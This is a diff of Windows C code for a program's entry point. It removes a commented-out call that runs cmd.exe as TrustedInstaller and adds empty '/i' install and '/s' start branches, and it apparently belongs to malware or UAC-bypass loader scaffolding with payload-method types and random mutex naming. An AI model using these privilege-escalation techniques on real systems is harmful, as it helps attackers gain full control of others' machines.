@@ -2,14 +2,6 @@
 
 typedef BOOL(*pEDllInit)(_In_ PPIB);
 typedef NTSTATUS(*ucmDebugObjectMethod)(_In_ PWSTR pszPayload);
-VOID IGenerateHardwareId(
-	_Out_ PUUID pHwId
-);
-BOOL ERunAsTrustedInstaller(
-	_In_     PCWSTR szFileName,
-	_In_     PCWSTR szCmdLine,
-	_In_opt_ PCWSTR szDirectory
-);
 
 INT WINAPI wWinMain(
 	_In_     HINSTANCE hInstance,
@@ -25,9 +17,18 @@ INT WINAPI wWinMain(
 		EXoshiroBegin(NULL);
 		IGenerateHardwareId(&g_PIB->sID.HW);
 		IGenerateSessionId(&g_PIB->sID.SE);
+		g_PIB->sArg.v = CommandLineToArgvW(pCmdLine, g_PIB->sArg.n);
 	}
 
-//	ERunAsTrustedInstaller(L"C:\WINDOWS\system32\cmd.exe", NULL, NULL);
+	if (g_PIB->sArg.n > 0) {
+		if (!lstrcmpW(g_PIB->sArg.v[0], L"/i")) { // Start Installation
+
+		} else if (!lstrcmpW(g_PIB->sArg.v[0], L"/s")) { // Start
+
+		}
+	} else {
+
+	}
 
 	// Create Random Mutex using SeId
 	SIZE_T nResult;
@@ -37,7 +38,7 @@ INT WINAPI wWinMain(
 	FreeMemory(szLocal);
 	PVOID pHWID = AllocMemory(MD5_SIZE);
 	CopyMemory(pHWID, &g_PIB->sID.SE, MD5_SIZE);
-	PCWSTR szRandom = EAllocRandomBase64StringW(pHWID, MAX_PATH / 2, MAX_PATH);
+	PCWSTR szRandom = EAllocRandomBase64StringW(pHWID, MAX_PATH / 2, MAX_PATH - 7);
 	FreeMemory(pHWID);
 	StringCchCatW(szMutex, MAX_PATH, szRandom);
 	FreeMemory(szRandom);
